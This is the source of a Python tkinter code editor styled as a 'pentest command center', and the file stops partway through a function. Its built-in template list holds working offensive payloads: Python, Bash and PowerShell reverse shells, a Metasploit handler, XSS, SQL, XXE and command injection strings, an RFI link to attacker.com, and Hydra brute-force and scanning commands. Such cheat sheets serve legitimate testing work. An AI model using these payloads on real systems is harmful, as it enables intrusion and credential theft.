# leviathan_edit.py - LEVIATHAN EDIT v1.0 - ULTIMATE CLASSIFIED PENTEST EDITOR
import tkinter as tk
from tkinter import messagebox, filedialog, colorchooser, ttk
from pygments import lex
from pygments.lexers import PythonLexer, JavascriptLexer, HtmlLexer, CssLexer, BashLexer, CLexer, CppLexer, JavaLexer, GoLexer, RustLexer, PhpLexer, RubyLexer, SqlLexer
from pygments.styles import get_style_by_name
import jedi
import base64
import urllib.parse
import re
import os
import json
try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

class LeviathanEdit:
    def __init__(self, master):
        self.master = master
        self.master.title("LEVIATHAN EDIT v1.0 - TOP SECRET // NOFORN")
        self.master.geometry("1600x1000")
        self.master.configure(bg="#000000")

        # === 10 EPIC THEMES ===
        self.themes = {
            "FBI Terminal": {
                "bg": "#000000", "panel": "#0d0d0d", "text": "#00ff41", "accent": "#00ff41",
                "line_bg": "#000000", "line_fg": "#004400", "select": "#003300", "cursor": "#00ff41"
            },
            "CIA BlackOps": {
                "bg": "#001122", "panel": "#001833", "text": "#00ffff", "accent": "#00ffff",
                "line_bg": "#001122", "line_fg": "#008888", "select": "#003366", "cursor": "#00ffff"
            },
            "NSA Quantum": {
                "bg": "#0a001f", "panel": "#1a0033", "text": "#ff00ff", "accent": "#ff00ff",
                "line_bg": "#0a001f", "line_fg": "#660066", "select": "#330066", "cursor": "#ff00ff"
            },
            "Matrix Rain": {
                "bg": "#000000", "panel": "#001100", "text": "#00ff00", "accent": "#00ff00",
                "line_bg": "#000000", "line_fg": "#003300", "select": "#002200", "cursor": "#00ff00"
            },
            "Blood Agent": {
                "bg": "#110000", "panel": "#220000", "text": "#ff3333", "accent": "#ff0000",
                "line_bg": "#110000", "line_fg": "#440000", "select": "#330000", "cursor": "#ff0000"
            },
            "Ghost Protocol": {
                "bg": "#0a0a1f", "panel": "#141428", "text": "#8888ff", "accent": "#4444ff",
                "line_bg": "#0a0a1f", "line_fg": "#333366", "select": "#222244", "cursor": "#8888ff"
            },
            "Zero Day": {
                "bg": "#001100", "panel": "#002200", "text": "#00ffaa", "accent": "#00ffaa",
                "line_bg": "#001100", "line_fg": "#004433", "select": "#003322", "cursor": "#00ffaa"
            },
            "Deep Web": {
                "bg": "#000011", "panel": "#000022", "text": "#44ff44", "accent": "#00ff00",
                "line_bg": "#000011", "line_fg": "#004400", "select": "#002200", "cursor": "#00ff00"
            },
            "Quantum Hack": {
                "bg": "#000033", "panel": "#000066", "text": "#00ccff", "accent": "#0088ff",
                "line_bg": "#000033", "line_fg": "#003366", "select": "#002244", "cursor": "#00ccff"
            },
            "Black Ice": {
                "bg": "#0f0f1f", "panel": "#1f1f3f", "text": "#88aaff", "accent": "#5588ff",
                "line_bg": "#0f0f1f", "line_fg": "#334466", "select": "#223355", "cursor": "#88aaff"
            }
        }

        self.current_theme = "FBI Terminal"
        self.custom_colors = self.themes[self.current_theme].copy()

        # Initialize language settings BEFORE create_ui()
        self.current_language = "Python"
        self.lexer = PythonLexer()
        self.style = get_style_by_name("dracula")
        
        # Language lexer mapping
        self.language_lexers = {
            "Python": PythonLexer(),
            "JavaScript": JavascriptLexer(),
            "HTML": HtmlLexer(),
            "CSS": CssLexer(),
            "Bash": BashLexer(),
            "C": CLexer(),
            "C++": CppLexer(),
            "Java": JavaLexer(),
            "Go": GoLexer(),
            "Rust": RustLexer(),
            "PHP": PhpLexer(),
            "Ruby": RubyLexer(),
            "SQL": SqlLexer()
        }

        # Font size and zoom
        self.base_font_size = 14
        self.current_font_size = 14

        # Background image and transparency settings
        self.background_image_path = None
        self.current_transparency = 1.0  # 1.0 = opaque, 0.0 = fully transparent

        # Load custom templates
        self.custom_templates = self.load_custom_templates()

        self.create_ui()

        self.text.insert("end", "# TOP SECRET // NOFORN // EYES ONLY\n# LEVIATHAN EDIT v1.0 - PENTEST COMMAND CENTER\n\n")
        self.apply_theme()
        self.on_type()

    def load_custom_templates(self):
        """Load custom templates from templates folder"""
        templates = {}
        templates_dir = os.path.join(os.path.dirname(__file__), "templates")
        
        # Create templates directory if it doesn't exist
        if not os.path.exists(templates_dir):
            os.makedirs(templates_dir)
            # Create README
            with open(os.path.join(templates_dir, "README.txt"), "w") as f:
                f.write("LEVIATHAN EDIT - Custom Templates Folder\n")
                f.write("="*50 + "\n\n")
                f.write("Place your template files here (.txt, .py, .sh, etc.)\n")
                f.write("Each file will appear as a template in the editor.\n")
                f.write("The filename will be used as the template name.\n")
        
        # Load all template files
        if os.path.exists(templates_dir):
            for filename in os.listdir(templates_dir):
                if filename.endswith(('.txt', '.py', '.sh', '.js', '.html', '.css', '.java', '.c', '.cpp', '.go', '.rs', '.php', '.rb', '.sql')):
                    filepath = os.path.join(templates_dir, filename)
                    try:
                        with open(filepath, 'r', encoding='utf-8') as f:
                            template_name = os.path.splitext(filename)[0].upper().replace('_', ' ')
                            templates[template_name] = f.read()
                    except:
                        pass
        
        return templates

    def create_ui(self):
        # === LEFT SIDEBAR - MODERN GLASS-LOOK ===
        sidebar = tk.Frame(self.master, bg="#111122", width=360, relief="flat")
        sidebar.pack(side="left", fill="y", padx=15, pady=15)
        sidebar.pack_propagate(False)

        # Title - Glowing
        title = tk.Label(sidebar, text="LEVIATHAN\nEDIT", font=("Orbitron", 32, "bold"),
                         fg="#00ff41", bg="#111122", justify="center")
        title.pack(pady=(40, 10))
        
        version = tk.Label(sidebar, text="v1.0 CLASSIFIED", font=("Consolas", 10),
                          fg="#ff0066", bg="#111122")
        version.pack(pady=(0, 20))

        # Tools - Sleek buttons
        tools = [
            ("BASE64 TOOL", self.open_base64),
            ("URL ENCODE/DECODE", self.open_url),
            ("HASH IDENTIFIER", self.open_hash),
            ("PAYLOAD TEMPLATES", self.open_templates),
        ]
        for name, cmd in tools:
            btn = tk.Button(sidebar, text=name, command=cmd, font=("Consolas", 11, "bold"),
                            bg="#003300", fg="#00ff41", activebackground="#005500",
                            relief="flat", padx=20, pady=12)
            btn.pack(fill="x", padx=30, pady=6)

        # === THEME SELECTOR - COLLAPSIBLE ===
        tk.Label(sidebar, text="CLASSIFIED THEMES", font=("Consolas", 12, "bold"),
                 fg="#ff0066", bg="#111122").pack(pady=(40,10))
        
        # Create frame for theme dropdown
        theme_frame = tk.Frame(sidebar, bg="#111122")
        theme_frame.pack(fill="x", padx=30, pady=5)
        
        self.theme_var = tk.StringVar(value=self.current_theme)
        theme_dropdown = ttk.Combobox(theme_frame, textvariable=self.theme_var, 
                                      values=list(self.themes.keys()),
                                      state="readonly", font=("Consolas", 10))
        theme_dropdown.pack(fill="x")
        theme_dropdown.bind("<<ComboboxSelected>>", lambda e: self.load_theme(self.theme_var.get()))

        # Custom color buttons - Collapsible
        tk.Label(sidebar, text="CUSTOM COLORS", font=("Consolas", 12, "bold"),
                 fg="#ffaa00", bg="#111122").pack(pady=(20,10))
        
        # Collapsible frame for custom colors
        self.colors_visible = False
        self.colors_frame = tk.Frame(sidebar, bg="#111122")
        
        color_opts = [
            ("Text Color", "text"),
            ("Accent/Cursor", "accent"),
            ("Background", "bg"),
            ("Panel BG", "panel"),
            ("Line Numbers", "line_fg"),
            ("Selection", "select")
        ]
        for label, key in color_opts:
            btn = tk.Button(self.colors_frame, text=label,
                            command=lambda k=key: self.pick_color(k),
                            bg="#333344", fg="#aaffaa", font=("Consolas", 9))
            btn.pack(fill="x", padx=10, pady=4)
        
        toggle_btn = tk.Button(sidebar, text="▼ SHOW COLORS ▼",
                               command=self.toggle_colors,
                               bg="#222233", fg="#00ffaa", font=("Consolas", 9))
        toggle_btn.pack(fill="x", padx=30, pady=5)
        self.color_toggle_btn = toggle_btn

        # Display Settings
        tk.Label(sidebar, text="DISPLAY SETTINGS", font=("Consolas", 12, "bold"),
                 fg="#00aaff", bg="#111122").pack(pady=(20,10))
        
        # Font size control
        font_frame = tk.Frame(sidebar, bg="#111122")
        font_frame.pack(fill="x", padx=30, pady=5)
        
        tk.Button(font_frame, text="A-", command=self.decrease_font,
                 bg="#330033", fg="#ff00ff", font=("Consolas", 10, "bold"),
                 width=5).pack(side="left", padx=5)
        tk.Label(font_frame, text="FONT", bg="#111122", fg="#00ffaa",
                font=("Consolas", 9, "bold")).pack(side="left", padx=5)
        tk.Button(font_frame, text="A+", command=self.increase_font,
                 bg="#330033", fg="#ff00ff", font=("Consolas", 10, "bold"),
                 width=5).pack(side="left", padx=5)
        
        # Window scale control
        scale_frame = tk.Frame(sidebar, bg="#111122")
        scale_frame.pack(fill="x", padx=30, pady=10)
        
        tk.Button(scale_frame, text="SMALL", command=lambda: self.resize_window(1200, 700),
                 bg="#003366", fg="#00ffff", font=("Consolas", 9, "bold"),
                 width=7).pack(side="left", padx=2)
        tk.Button(scale_frame, text="MEDIUM", command=lambda: self.resize_window(1600, 1000),
                 bg="#003366", fg="#00ffff", font=("Consolas", 9, "bold"),
                 width=7).pack(side="left", padx=2)
        tk.Button(scale_frame, text="LARGE", command=lambda: self.resize_window(1920, 1080),
                 bg="#003366", fg="#00ffff", font=("Consolas", 9, "bold"),
                 width=7).pack(side="left", padx=2)

        # Transparency control
        tk.Label(sidebar, text="TRANSPARENCY", font=("Consolas", 12, "bold"),
                 fg="#ff00ff", bg="#111122").pack(pady=(20,10))
        
        transparency_frame = tk.Frame(sidebar, bg="#111122")
        transparency_frame.pack(fill="x", padx=30, pady=5)
        
        self.transparency_scale = tk.Scale(transparency_frame, from_=0.3, to=1.0, resolution=0.05,
                                          orient="horizontal", bg="#111122", fg="#ff00ff",
                                          font=("Consolas", 9), command=self.change_transparency,
                                          highlightthickness=0, troughcolor="#330033",
                                          activebackground="#ff00ff")
        self.transparency_scale.set(1.0)
        self.transparency_scale.pack(fill="x")
        
        # Background image
        tk.Label(sidebar, text="BACKGROUND", font=("Consolas", 12, "bold"),
                 fg="#00ff88", bg="#111122").pack(pady=(20,10))
        
        bg_frame = tk.Frame(sidebar, bg="#111122")
        bg_frame.pack(fill="x", padx=30, pady=5)
        
        tk.Button(bg_frame, text="SET IMAGE", command=self.set_background_image,
                 bg="#003333", fg="#00ffaa", font=("Consolas", 9, "bold"),
                 padx=10, pady=8).pack(side="left", padx=5)
        tk.Button(bg_frame, text="CLEAR", command=self.clear_background_image,
                 bg="#333300", fg="#ffaa00", font=("Consolas", 9, "bold"),
                 padx=10, pady=8).pack(side="left", padx=5)

        # === MAIN EDITOR AREA ===
        main = tk.Frame(self.master, bg="#000000")
        main.pack(fill="both", expand=True, padx=15, pady=15)

        # Toolbar
        toolbar = tk.Frame(main, bg="#111122", relief="raised", bd=2)
        toolbar.pack(fill="x", pady=(0,15))
        tk.Button(toolbar, text=" NEW FILE ", command=self.new_file, bg="#003300", fg="#00ff41", font=("Consolas", 10, "bold")).pack(side="left", padx=10, pady=8)
        tk.Button(toolbar, text=" OPEN FILE ", command=self.open_file, bg="#003300", fg="#00ff41", font=("Consolas", 10, "bold")).pack(side="left", padx=10, pady=8)
        tk.Button(toolbar, text=" SAVE AS ", command=self.save_file, bg="#003300", fg="#00ff41", font=("Consolas", 10, "bold")).pack(side="left", padx=10, pady=8)
        
        # Language selector
        tk.Label(toolbar, text="LANG:", bg="#111122", fg="#00ff41", font=("Consolas", 10, "bold")).pack(side="left", padx=(30,5))
        self.lang_var = tk.StringVar(value="Python")
        lang_menu = tk.OptionMenu(toolbar, self.lang_var, *self.language_lexers.keys(), command=self.change_language)
        lang_menu.config(bg="#003300", fg="#00ff41", font=("Consolas", 9, "bold"), highlightthickness=0)
        lang_menu.pack(side="left", padx=5)

        # Editor + Line Numbers
        editor_frame = tk.Frame(main)
        editor_frame.pack(fill="both", expand=True)

        self.line_numbers = tk.Text(editor_frame, width=6, state="disabled", font=("Consolas", self.current_font_size),
                                    bg="#000000", fg="#004400", relief="flat")
        self.line_numbers.pack(side="left", fill="y")

        # Add scrollbars
        v_scrollbar = tk.Scrollbar(editor_frame, orient="vertical")
        h_scrollbar = tk.Scrollbar(main, orient="horizontal")
        
        self.text = tk.Text(editor_frame, undo=True, wrap="none", font=("Consolas", self.current_font_size),
                            insertwidth=3, relief="flat", bd=10,
                            yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        v_scrollbar.config(command=self.text.yview)
        h_scrollbar.config(command=self.text.xview)
        
        v_scrollbar.pack(side="right", fill="y")
        self.text.pack(side="left", fill="both", expand=True)
        h_scrollbar.pack(side="bottom", fill="x")

        # Scroll sync for line numbers
        def sync(*args):
            self.line_numbers.yview_moveto(self.text.yview()[0])
            v_scrollbar.set(*args)
        self.text.config(yscrollcommand=sync)

        # Smart autocomplete
        self.text.bind("<KeyRelease>", self.on_key_release)
        self.text.bind("<Tab>", lambda e: (self.text.insert("insert", "    "), "break"))
        self.completion_window = None

        # Right-click context menu
        self.context_menu = tk.Menu(self.text, tearoff=0, bg="#001122", fg="#00ffaa",
                                    font=("Consolas", 10), activebackground="#003366")
        self.create_context_menu()
        self.text.bind("<Button-3>", self.show_context_menu)

        # Status bar - Glowing red
        self.status = tk.Label(main, text="STATUS: ACTIVE // NOFORN", font=("Consolas", 11, "bold"),
                               bg="#330000", fg="#ff0066", anchor="w", relief="sunken", bd=2)
        self.status.pack(fill="x", side="bottom")

    def toggle_colors(self):
        """Toggle visibility of custom color buttons"""
        if self.colors_visible:
            self.colors_frame.pack_forget()
            self.color_toggle_btn.config(text="▼ SHOW COLORS ▼")
            self.colors_visible = False
        else:
            self.colors_frame.pack(fill="x", padx=30, before=self.color_toggle_btn)
            self.color_toggle_btn.config(text="▲ HIDE COLORS ▲")
            self.colors_visible = True

    def create_context_menu(self):
        """Create right-click context menu with templates"""
        self.context_menu.delete(0, 'end')
        self.context_menu.add_command(label="Cut", command=lambda: self.text.event_generate("<<Cut>>"))
        self.context_menu.add_command(label="Copy", command=lambda: self.text.event_generate("<<Copy>>"))
        self.context_menu.add_command(label="Paste", command=lambda: self.text.event_generate("<<Paste>>"))
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Select All", command=lambda: self.text.tag_add("sel", "1.0", "end"))
        self.context_menu.add_separator()
        
        # Templates submenu
        templates_menu = tk.Menu(self.context_menu, tearoff=0, bg="#001122", fg="#00ffaa",
                                font=("Consolas", 9), activebackground="#003366")
        
        # Built-in templates
        builtin_templates = self.get_builtin_templates()
        for name in sorted(builtin_templates.keys()):
            templates_menu.add_command(label=name, 
                                      command=lambda n=name: self.insert_template(builtin_templates[n]))
        
        # Custom templates
        if self.custom_templates:
            templates_menu.add_separator()
            templates_menu.add_command(label="--- CUSTOM TEMPLATES ---", state="disabled")
            templates_menu.add_separator()
            for name in sorted(self.custom_templates.keys()):
                templates_menu.add_command(label=name,
                                          command=lambda n=name: self.insert_template(self.custom_templates[n]))
        
        self.context_menu.add_cascade(label="Insert Template ➤", menu=templates_menu)

    def show_context_menu(self, event):
        """Show context menu on right-click"""
        try:
            self.context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            self.context_menu.grab_release()

    def insert_template(self, code):
        """Insert template code at cursor position"""
        self.text.insert("insert", "\n" + code + "\n")
        self.on_type()

    def increase_font(self):
        """Increase font size"""
        self.current_font_size = min(self.current_font_size + 2, 32)
        self.update_font()

    def decrease_font(self):
        """Decrease font size"""
        self.current_font_size = max(self.current_font_size - 2, 8)
        self.update_font()

    def update_font(self):
        """Update font sizes for editor and line numbers"""
        self.text.config(font=("Consolas", self.current_font_size))
        self.line_numbers.config(font=("Consolas", self.current_font_size))
        self.status.config(text=f"FONT SIZE: {self.current_font_size}pt // THEME: {self.current_theme}")

    def resize_window(self, width, height):
        """Resize the main window"""
        self.master.geometry(f"{width}x{height}")
        self.status.config(text=f"WINDOW: {width}x{height} // THEME: {self.current_theme}")

    def change_transparency(self, value):
        """Change window transparency"""
        self.current_transparency = float(value)
        self.master.attributes('-alpha', self.current_transparency)
        self.status.config(text=f"TRANSPARENCY: {int(self.current_transparency * 100)}% // THEME: {self.current_theme}")

    def set_background_image(self):
        """Set a background image for the editor"""
        if not PIL_AVAILABLE:
            messagebox.showerror("PIL NOT INSTALLED", 
                               "Background images require Pillow library.\n\n"
                               "Install with: pip install Pillow")
            return
        
        filepath = filedialog.askopenfilename(
            title="Select Background Image",
            filetypes=[
                ("Image Files", "*.png *.jpg *.jpeg *.gif *.bmp"),
                ("All Files", "*.*")
            ]
        )
        
        if filepath:
            try:
                # Load and resize image
                img = Image.open(filepath)
                
                # Get text widget size
                width = self.text.winfo_width()
                height = self.text.winfo_height()
                
                if width <= 1 or height <= 1:
                    width, height = 1200, 800
                
                # Resize image to fit and apply darkening for readability
                img = img.resize((width, height), Image.Resampling.LANCZOS)
                
                # Darken the image for better text readability
                from PIL import ImageEnhance
                enhancer = ImageEnhance.Brightness(img)
                img = enhancer.enhance(0.3)  # 30% brightness for readability
                
                # Create PhotoImage
                self.bg_image = ImageTk.PhotoImage(img)
                
                # Store current text content
                content = self.text.get("1.0", "end")
                
                # Clear and add image
                self.text.delete("1.0", "end")
                self.text.image_create("1.0", image=self.bg_image, align="center")
                self.text.insert("1.0", content)
                
                self.background_image_path = filepath
                
                messagebox.showinfo("BACKGROUND SET", "Background image applied!\n\nTip: Adjust transparency slider for best effect.")
                self.status.config(text="BACKGROUND IMAGE ACTIVE // CLASSIFIED")
            except Exception as e:
                messagebox.showerror("ERROR", f"Failed to load image: {str(e)}")

    def clear_background_image(self):
        """Clear the background image"""
        self.background_image_path = None
        # Reapply theme to reset background
        self.apply_theme()
        self.status.config(text="BACKGROUND CLEARED // THEME: " + self.current_theme)

    def pick_color(self, key):
        color = colorchooser.askcolor(title=f"Choose {key}")
        if color[1]:
            self.custom_colors[key] = color[1]
            self.apply_theme()

    def load_theme(self, name):
        self.current_theme = name
        self.custom_colors = self.themes[name].copy()
        self.apply_theme()

    def apply_theme(self):
        c = self.custom_colors
        self.master.configure(bg=c["bg"])
        self.text.config(
            bg=c["bg"], fg=c["text"], insertbackground=c["cursor"],
            selectbackground=c["select"]
        )
        self.line_numbers.config(bg=c["line_bg"], fg=c["line_fg"])
        self.status.config(text=f"THEME: {self.current_theme} // LANG: {self.current_language}")

    def change_language(self, lang):
        self.current_language = lang
        self.lexer = self.language_lexers[lang]
        self.on_type()
        self.status.config(text=f"LANG: {lang} // THEME: {self.current_theme}")

    def open_file(self):
        f = filedialog.askopenfilename(
            filetypes=[
                ("All Files", "*.*"),
                ("Python", "*.py"),
                ("JavaScript", "*.js"),
                ("HTML", "*.html"),
                ("CSS", "*.css"),
                ("Bash", "*.sh"),
                ("C/C++", "*.c *.cpp *.h"),
                ("Java", "*.java"),
                ("Text", "*.txt")
            ]
        )
        if f:
            with open(f, "r", encoding="utf-8") as file:
                content = file.read()
                self.text.delete("1.0", "end")
                self.text.insert("1.0", content)
            
            # Auto-detect language from extension
            ext = f.split('.')[-1].lower()
            lang_map = {
                'py': 'Python', 'js': 'JavaScript', 'html': 'HTML', 'css': 'CSS',
                'sh': 'Bash', 'c': 'C', 'cpp': 'C++', 'h': 'C', 'java': 'Java',
                'go': 'Go', 'rs': 'Rust', 'php': 'PHP', 'rb': 'Ruby', 'sql': 'SQL'
            }
            if ext in lang_map:
                self.lang_var.set(lang_map[ext])
                self.change_language(lang_map[ext])
            
            messagebox.showinfo("FILE LOADED", f"DECRYPTED: {f}")

    def on_key_release(self, event=None):
        """Handle key release for autocomplete"""
        if event:
            # Trigger autocomplete for alphanumeric and specific characters
            if event.char.isalnum() or event.char in "._":
                # Check if we should show autocomplete
                cursor_pos = self.text.index("insert")
                line_start = self.text.index(f"{cursor_pos} linestart")
                current_line = self.text.get(line_start, cursor_pos)
                
                # Get the current word being typed
                words = current_line.split()
                if words and len(words[-1]) >= 2:  # Show after 2 characters
                    self.master.after(100, self.try_autocomplete)
            
            # Close autocomplete on certain keys
            elif event.keysym in ('space', 'Return', 'Escape'):
                if self.completion_window:
                    self.completion_window.destroy()
                    self.completion_window = None
        
        self.on_type()

    def try_autocomplete(self):
        """Show autocomplete suggestions"""
        if self.completion_window:
            return
        
        pos = self.text.index("insert")
        line, col = map(int, pos.split('.'))
        source = self.text.get("1.0", "end-1c")
        
        try:
            script = jedi.Script(source, line, col)
            completions = script.complete()
        except:
            return
        
        if not completions:
            return

        self.completion_window = tk.Toplevel(self.master)
        self.completion_window.wm_overrideredirect(True)
        self.completion_window.configure(bg="#001122", bd=2, relief="solid")

        # Position near cursor
        try:
            bbox = self.text.bbox(pos)
            if bbox:
                x = self.text.winfo_rootx() + bbox[0]
                y = self.text.winfo_rooty() + bbox[1] + 20
            else:
                x = self.text.winfo_rootx() + 100
                y = self.text.winfo_rooty() + 100
        except:
            x = self.text.winfo_rootx() + 100
            y = self.text.winfo_rooty() + 100
        
        self.completion_window.wm_geometry(f"+{x}+{y}")

        # Create listbox with completions
        lb = tk.Listbox(self.completion_window, bg="#001122", fg="#00ffaa",
                        font=("Consolas", 11), height=min(10, len(completions)),
                        selectbackground="#003366", width=30,
                        highlightthickness=1, highlightbackground="#00ffaa")
        lb.pack()
        
        for comp in completions[:20]:
            # Show name and type
            display = f"{comp.name}"
            if comp.type:
                display += f" ({comp.type})"
            lb.insert("end", display)

        def choose(e=None):
            if lb.curselection():
                sel = lb.get(lb.curselection())
                # Extract just the name part
                name = sel.split('(')[0].strip()
                
                # Get current word to replace
                cursor_pos = self.text.index("insert")
                line_start = self.text.index(f"{cursor_pos} linestart")
                current_line = self.text.get(line_start, cursor_pos)
                
                # Find the partial word being typed
                words = current_line.split()
                if words:
                    partial = words[-1]
                    # Delete the partial word
                    delete_start = self.text.index(f"insert - {len(partial)}c")
                    self.text.delete(delete_start, "insert")
                
                # Insert completion
                self.text.insert("insert", name)
                close_window()
        
        def close_window(e=None):
            if self.completion_window:
                self.completion_window.destroy()
                self.completion_window = None
        
        def navigate(e):
            if e.keysym == 'Down':
                current = lb.curselection()
                if current:
                    next_idx = min(current[0] + 1, lb.size() - 1)
                else:
                    next_idx = 0
                lb.selection_clear(0, 'end')
                lb.selection_set(next_idx)
                lb.see(next_idx)
            elif e.keysym == 'Up':
                current = lb.curselection()
                if current:
                    next_idx = max(current[0] - 1, 0)
                else:
                    next_idx = 0
                lb.selection_clear(0, 'end')
                lb.selection_set(next_idx)
                lb.see(next_idx)
        
        # Bindings
        lb.bind("<Double-1>", choose)
        lb.bind("<Return>", choose)
        lb.bind("<Escape>", close_window)
        lb.bind("<Down>", navigate)
        lb.bind("<Up>", navigate)
        
        # Focus on listbox and select first item
        lb.focus_set()
        lb.selection_set(0)
        
        # Auto-close on focus loss
        self.completion_window.bind("<FocusOut>", close_window)

    def on_type(self):
        self.highlight_syntax()
        self.update_lines()

    def update_lines(self):
        count = int(self.text.index('end-1c').split('.')[0])
        self.line_numbers.config(state="normal")
        self.line_numbers.delete("1.0", "end")
        self.line_numbers.insert("1.0", "\n".join(f"{i:05d}" for i in range(1, count + 1)))
        self.line_numbers.config(state="disabled")

    def highlight_syntax(self):
        for tag in self.text.tag_names():
            if tag.startswith("py_"):
                self.text.tag_delete(tag)
        content = self.text.get("1.0", "end")
        self.text.mark_set("range_start", "1.0")
        for token, value in lex(content, self.lexer):
            start = self.text.index("range_start")
            end = f"{start} + {len(value)}c"
            style = self.style.style_for_token(token)
            color = style.get("color", "00ff00")
            tag = f"py_{color}"
            if tag not in self.text.tag_names():
                self.text.tag_config(tag, foreground=f"#{color}")
            self.text.tag_add(tag, start, end)
            self.text.mark_set("range_start", end)

    def new_file(self):
        if messagebox.askyesno("NEW", "WIPE CURRENT SESSION?"):
            self.text.delete("1.0", "end")

    def save_file(self):
        f = filedialog.asksaveasfilename(defaultextension=".py")
        if f:
            with open(f, "w", encoding="utf-8") as file:
                file.write(self.text.get("1.0", "end"))
            messagebox.showinfo("SECURED", "FILE ENCRYPTED AND SAVED")

    def get_builtin_templates(self):
        """Return dictionary of built-in templates"""
        templates = {
            "PYTHON REVERSE SHELL": '''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])''',
            
            "BASH REVERSE SHELL": '''bash -i >& /dev/tcp/10.10.10.10/4444 0>&1''',
            
            "POWERSHELL REVERSE SHELL": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"''',
            
            "NETCAT LISTENER": '''nc -lvnp 4444''',
            
            "XSS BASIC": '''<script>alert(document.cookie)</script>''',
            
            "XSS IMG TAG": '''<img src=x onerror=alert(document.cookie)>''',
            
            "XSS ADVANCED": '''<svg/onload=alert(String.fromCharCode(88,83,83))>''',
            
            "SQL INJECTION UNION": """' UNION SELECT NULL,NULL,NULL--""",
            
            "SQL INJECTION AUTH BYPASS": """' OR '1'='1' --""",
            
            "SQL INJECTION TIME BASED": """' OR IF(1=1, SLEEP(5), 0)--""",
            
            "NMAP AGGRESSIVE SCAN": '''nmap -A -T4 -p- 10.10.10.10''',
            
            "NMAP VULN SCAN": '''nmap -sV --script vuln 10.10.10.10''',
            
            "NMAP SERVICE SCAN": '''nmap -sV -sC -p- 10.10.10.10 -oN scan.txt''',
            
            "METASPLOIT HANDLER": '''use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit''',
            
            "GOBUSTER DIR SCAN": '''gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt''',
            
            "FFUF WEB FUZZING": '''ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt''',
            
            "SQLMAP BASIC": '''sqlmap -u "http://10.10.10.10/page.php?id=1" --batch --dbs''',
            
            "CURL POST REQUEST": '''curl -X POST http://10.10.10.10/login -d "username=admin&password=password"''',
            
            "LFI PAYLOAD": '''../../../etc/passwd''',
            
            "RFI PAYLOAD": '''http://attacker.com/shell.txt?''',
            
            "XXE INJECTION": '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>''',
            
            "COMMAND INJECTION": '''; cat /etc/passwd #''',
            
            "SMBCLIENT CONNECT": '''smbclient //10.10.10.10/share -U username''',
            
            "HYDRA SSH BRUTE": '''hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10''',
        }
        return templates

    # === TOOLS ===
    def open_base64(self):
        w = tk.Toplevel(self.master)
        w.title("BASE64 ENCODER/DECODER")
        w.configure(bg="#000011")
        w.geometry("700x600")
        
        tk.Label(w, text="INPUT:", bg="#000011", fg="#00ffaa", font=("Consolas", 12, "bold")).pack(pady=(20,5))
        input_text = tk.Text(w, height=8, bg="#001122", fg="#00ffaa", font=("Consolas", 11))
        input_text.pack(padx=20, pady=5, fill="both", expand=True)
        
        tk.Label(w, text="OUTPUT:", bg="#000011", fg="#00ffaa", font=("Consolas", 12, "bold")).pack(pady=(10,5))
        output_text = tk.Text(w, height=8, bg="#001122", fg="#00ffaa", font=("Consolas", 11))
        output_text.pack(padx=20, pady=5, fill="both", expand=True)
        
        btn_frame = tk.Frame(w, bg="#000011")
        btn_frame.pack(pady=20)
        
        def encode_b64():
            try:
                data = input_text.get("1.0", "end-1c")
                encoded = base64.b64encode(data.encode()).decode()
                output_text.delete("1.0", "end")
                output_text.insert("1.0", encoded)
            except Exception as e:
                messagebox.showerror("ERROR", str(e))
        
        def decode_b64():
            try:
                data = input_text.get("1.0", "end-1c")
                decoded = base64.b64decode(data.encode()).decode()
                output_text.delete("1.0", "end")
                output_text.insert("1.0", decoded)
            except Exception as e:
                messagebox.showerror("ERROR", str(e))
        
        tk.Button(btn_frame, text="ENCODE", command=encode_b64, bg="#003300", fg="#00ff41", 
                 font=("Consolas", 11, "bold"), padx=20, pady=10).pack(side="left", padx=10)
        tk.Button(btn_frame, text="DECODE", command=decode_b64, bg="#330000", fg="#ff4444", 
                 font=("Consolas", 11, "bold"), padx=20, pady=10).pack(side="left", padx=10)

    def open_url(self):
        w = tk.Toplevel(self.master)
        w.title("URL ENCODER/DECODER")
        w.configure(bg="#000011")
        w.geometry("700x600")
        
        tk.Label(w, text="INPUT:", bg="#000011", fg="#00ffaa", font=("Consolas", 12, "bold")).pack(pady=(20,5))
        input_text = tk.Text(w, height=8, bg="#001122", fg="#00ffaa", font=("Consolas", 11))
        input_text.pack(padx=20, pady=5, fill="both", expand=True)
        
        tk.Label(w, text="OUTPUT:", bg="#000011", fg="#00ffaa", font=("Consolas", 12, "bold")).pack(pady=(10,5))
        output_text = tk.Text(w, height=8, bg="#001122", fg="#00ffaa", font=("Consolas", 11))
        output_text.pack(padx=20, pady=5, fill="both", expand=True)
        
        btn_frame = tk.Frame(w, bg="#000011")
        btn_frame.pack(pady=20)
        
        def encode_url():
            try:
                data = input_text.get("1.0", "end-1c")
                encoded = urllib.parse.quote(data)
                output_text.delete("1.0", "end")
                output_text.insert("1.0", encoded)
            except Exception as e:
                messagebox.showerror("ERROR", str(e))
        
        def decode_url():
            try:
                data = input_text.get("1.0", "end-1c")
                decoded = urllib.parse.unquote(data)
                output_text.delete("1.0", "end")
                output_text.insert("1.0", decoded)
            except Exception as e:
